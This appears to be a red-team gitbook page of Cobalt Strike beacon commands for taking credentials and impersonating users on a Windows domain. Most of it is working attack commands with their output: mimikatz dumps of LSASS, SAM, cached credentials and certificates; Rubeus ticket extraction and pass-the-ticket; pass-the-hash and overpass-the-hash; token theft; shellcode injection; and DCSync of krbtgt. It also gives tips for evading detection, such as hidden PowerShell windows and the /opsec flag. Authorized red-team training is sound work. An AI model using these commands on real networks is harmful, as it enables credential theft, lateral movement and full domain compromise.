---
title: Credentials & User Impersonation
category: Red Team
order: 8
---

Once we have access to user credentials or being able to impersonate the identity of a user we can move laterally.

In this section it will be explained how to obtain credentials after fully compromise a host (admin privs needed!).

# Get users logged on the host

With the command `net` we can get any users that are currently logged onto the host.

```
beacon> net logons
Logged on users at \\localhost:

CORP\SRV-1$
CORP\user
```

With `ps` we can list which processes are running under which user.

```
beacon> ps

PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
448   796   RuntimeBroker.exe            x64   1           CORP\user
```

# Logon Passwords

As we seen on this gitbook, with mimikatz we can retrieve NTLM hashes from LSASS.

The `sekurlsa::logonpasswords` comman in mimikatz can dump **plaintext** passwords from memory if **wdigest is enabled**, which is disabled by default.

```
beacon> mimikatz sekurlsa::logonpasswords
```

Or we can use the short-command.

```
beacon> logonpasswords
```

After dumping the credentials, they are stored in `View -> Credentials`.


# eKeys

Exists a mimikatz module that dumps kerberos encryption keys. Since most of the windows services choose to use kerberos over NTLM.

```
beacon> mimikatz sekurlsa::ekeys
```

We are interested in `aes256_hmac` and `aes128_hmac` if is available. It will be used during **Overpass-The-Hash** technique.

# Certificates

To enumerate certificates use `Seatbelt`.

```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates
```

> **Note**: Ensure that the certificate is **used for authentication**.

We can dump certificates with mimikatz.

* For users:

```
beacon> mimikatz crypto::certificates /export
```

* For machines:

```
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
```

> **NOTE**: Mimikatz always export certificates with `mimikatz` as password.

Download the file and sync files from cobalt strike to your local machine.

```
beacon> download C:\Users\user\CURRENT_USER_My_0_User Example.pfx
```

> **Note** : Go to `View -> Downloads` to sync files.

Encode in base64 the `.pfx` file.

```
cat CURRENT_USER_My_0_User\ Example.pfx | base64 -w0
```
And finally use it to request a TGT.


# Security Account Manager

The Security Account Manager (SAM) database holds the NTLM hashes of local accounts.

It's common that a local administrator use the same password across the entire environment.

```
beacon> mimikatz lsadump::sam
```

# Domain Cached Credentials

Domain Cached Credentials were designed for instances where domain credentials are required to logon to a machine, even whilst it's disconnected from the domain.

```
beacon> mimikatz lsadump::cache
```

# Make Token  

The `make_token` module which takes the username, domain and plaintext password for a user, as well as a logon type.

This logon type allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identifier but uses different credentials for other network connections.

`make_token` uses `LOGON32_LOGON_NEW_CREDENTIALS` logon type.

```
beacon> make_token CORP\user Passw0rd!
```

With `rev2self` will drop the impersonation.

```
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 20 bytes
```

> **Note** We can also login as Local User:
>
> `beacon> make_token .\lapsadmin password`

# Extracting Kerberos Tickets

Instead of craft a TGT we can retrieve it directly from memory.

Rubeus `triage` will list the kerberos tickets in all the logon sessions.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ----------------------------------------------------------------------------- 
 | LUID    | UserName           | Service            | EndTime               |
 -----------------------------------------------------------------------------
 | 0x462eb | user1 @ CORP.LOCAL | krbtgt/CORP.LOCAL  | 5/12/2021 12:34:03 AM |
 | 0x25ff6 | user2 @ CORP.LOCAL | krbtgt/CORP.LOCAL  | 5/12/2021 12:33:41 AM |
 -----------------------------------------------------------------------------
```

> *Note*: `krbtgt` service means that the ticket is a TGT.

We can extrat it from memory with `dump`.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap
```

Create a sacrificial logon with `createnetonly` and obtain a `LUID` and `ProcessID`.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4872
[+] LUID            : 0x92a8c
```

Now with `ptt` we can pass the extracted TGT.

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]

[*] Action: Import Ticket
[*] Target LUID: 0x92a8c
[+] Ticket successfully imported!
```

We can also use `make_token` and `kerberos_ticket_use` to import a TGT to the session.

Steal the access token of that process and access to the target resource.

```
beacon> steal_token 5674
```

# Process Injection

We can `inject` a beacon payload into a target process in the form of shellcode.

If we inject the beacon into a process owned by a different user, the beacon will run with the local and domain privileges of that user.

```
beacon> ps

PID   PPID  Name                   Arch  Session     User
---   ----  ----                   ----  -------     -----
448   796   explorer.exe            x64  1           CORP\user

beacon> inject 448 x64 smb-p2p-payload
[+] established link to child beacon: 10.10.10.10
```

> **Note**: If we try to inject into a process owned by other user we will need admin privs.

> **OPSEC Note**: Don't perform cross-platform injection unless is needed.
>
> `x64 -> x86` or `x86 -> x64`

# Token Impersonation

The `steal_token` command will impersonate the access token of the target process.

```
beacon> ps

PID   PPID  Name                   Arch  Session     User
---   ----  ----                   ----  -------     -----
448   796   explorer.exe            x64  1           CORP\user

beacon> steal_token 448
[+] Impersonated CORP\user
```

> **Note**: `steal_token` is good for access remote resources across network but not for local actions.

With `rev2self` will drop the impersonation.

```
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 20 bytes
```

# Pass The Hash

Is a technique which allows you to authenticate to a Windows service using the NTLM hash of a user's password.

> **Note**: This modification process requires patching of LSASS memory which is high-risk action.

```
beacon> pth CORP\user 4ffd3eabdce2e158d923ddec72de9790
```

In order to avoid detection, we can use `mimikatz` and specify a own process.

```
beacon> mimikatz sekurlsa::pth /user:user /domain:corp.local /ntlm:4ffd3eabdce2e158d923ddec72de9790 /run:"powershell -w hidden"
```

> **OPSEC Alert**: If no `/run` parameter is specified, a `cmd.exe` window will be started. To avoid that use `powershell -w hidden` to create a hidden window.

Finally use `steal_token` to impersonate the user ith the spawned process.

```
beacon> steal_token 4563
```

Once finished remember to to use `rev2self` and `kill` the spawned process.

```
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 8 bytes

beacon> kill 4563
[*] Tasked beacon to kill 4563
[+] host called home, sent: 12 bytes
```

# OverPass The Hash

OverPass The Hash also known as Pass The Key allows authentication with Kerberos rather than with NTLM.

We can use NTLM hash or AES Keys to request a Kerberos TGT Ticket.

To execute that technique we will use `Rubeus`.

```
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:user /domain:corp.local /rc4:4ffd3eabdce2e158d923ddec72de9790 /nowrap
```

> **OPSEC Alert**: Use AES keys rather than NTLM. Rubeus has an `/opsec` argument which tells it to send the request without pre-auth, to emulate a legit kerberos traffic.

```
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:user /domain:CORP /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec10 /nowrap /opsec
```
> **Note**: Don't use FQDN `corp.local` to specify the domain. Use the NetBIOS `CORP`.

Once a ticket is created we can check it with `klist`.

```
beacon> run klist
```

Finally we can use `make_token` with a dummy password to spawn a session.

```
beacon> make_token CORP\user NOTREALPASSWORD
```

To pass the TGT into this logon session, we can use Beacon's `kerberos_ticket_use` command. This require that the ticket be on disk of our attacking workstation.

```powershell
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\UserTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
```
```
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi 
```
## Elevated context

If is on an elevated context, we can do it with Rubeus.

```
beacon> execute-assembly C:\Tools\Rubeus.exe asktgt /user:user /domain:corp.local /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec10 /nowrap /opsec  /createnetonly:C:\Windows\System32\cmd.exe
```
```
beacon> steal_token 3453
```
# Pass The Ticket

We can use the `make_token` module with a fake password if we inject kerberos tickets on memory.

```
beacon> make_token CORP\user FakePass
```
We can use `kerberos_ticket_use` to select a TGT of the user to impersonate.

If we obtain a ticket from Rubeus and we have it in Base64 we will need to decode it and store on a file

```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Tickets\user.kirbi", [System.Convert]::FromBase64String("doIGWD[...snip...]MuaW8="))
```

After that we can use the ticket.

```
beacon> kerberos_ticket_use C:\Tickets\user.kirbi
```

> **Note**: `kerberos_ticket_use` allows us to inject on memory `TGT` and `TGS`.

> **Note**: After importing the ticket make sure to always use the FQDN. If not some `1326 errors` will appear.



# DCSync

The Directory Replication Service (MS-DRSR) protocol is used to synchronise and replicate Active Directory data between domain controllers.  DCSync is a technique which leverages this protocol to extract username and credential data from a DC.

This tecnhique requires `GetNCChanges` which is usually only available for Domain Admins.

```
beacon> dcsync corp.local CORP\krbtgt
```